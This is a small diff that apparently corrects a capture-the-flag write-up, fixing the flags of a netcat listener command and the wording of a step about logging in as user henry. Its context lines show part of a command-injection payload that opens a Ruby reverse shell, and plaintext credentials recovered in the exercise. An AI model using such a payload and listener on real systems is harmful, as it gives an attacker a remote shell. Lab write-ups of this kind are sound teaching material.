@@ -114,7 +114,7 @@ payload = f"http://%20`ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.
 
 ```bash
 
-nc -lvpn 4444
+nc -lvnp 4444
 
 ```
 
@@ -170,7 +170,7 @@ credentials - henry : Q3c1AqGHtoI0aXAYFH
 
 > get credentials for henry user in clear text.
 
-> Connect to henry other ssh and get first flag:
+> Connect to henry user and get first flag:
 
 ```bash
 
